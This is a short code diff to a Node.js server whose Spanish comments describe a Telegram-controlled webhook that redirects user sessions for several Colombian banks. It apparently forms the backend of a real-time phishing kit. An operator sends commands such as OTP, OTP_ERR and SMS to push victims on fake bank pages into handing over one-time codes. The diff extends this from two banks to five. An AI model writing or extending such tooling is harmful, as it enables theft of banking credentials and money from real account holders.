@@ -158,18 +158,20 @@ app.post('/telegram/webhook', (req, res) => {
 
     if (sessionId) {
       const s = sessions.get(sessionId) || {};
-      // Soporte para ambos bancos:
+      // Soporte para múltiples bancos:
       // - Bancolombia: envía URL mapeada (index.html?state=...)
-      // - Banco de Bogotá: envía comando original (OTP, CORREO, etc.)
+      // - Banco de Bogotá, AV Villas, Caja Social, Banco Popular: envían comandos originales
       const url = resolveCode(cmd);
+      const commandOnlyBanks = ['bogota', 'avvillas', 'cajasocial', 'popular'];
+
       if (s.bank === 'bancolombia' && url) {
-        // Bancolombia espera URLs
+        // Bancolombia espera URLs mapeadas
         s.redirect_to = url;
-      } else if (!s.bank || s.bank === 'bogota') {
-        // Banco de Bogotá espera comandos originales
+      } else if (!s.bank || commandOnlyBanks.includes(s.bank)) {
+        // Bancos que esperan comandos originales (INICIO, OTP, OTP_ERR, SMS, etc.)
         s.redirect_to = cmd;
       } else {
-        // Fallback: si hay URL mapeada, usar URL; si no, usar comando
+        // Fallback para bancos desconocidos: usar URL si existe, si no usar comando
         s.redirect_to = url || cmd;
       }
       s.last_msg_id = msgId;
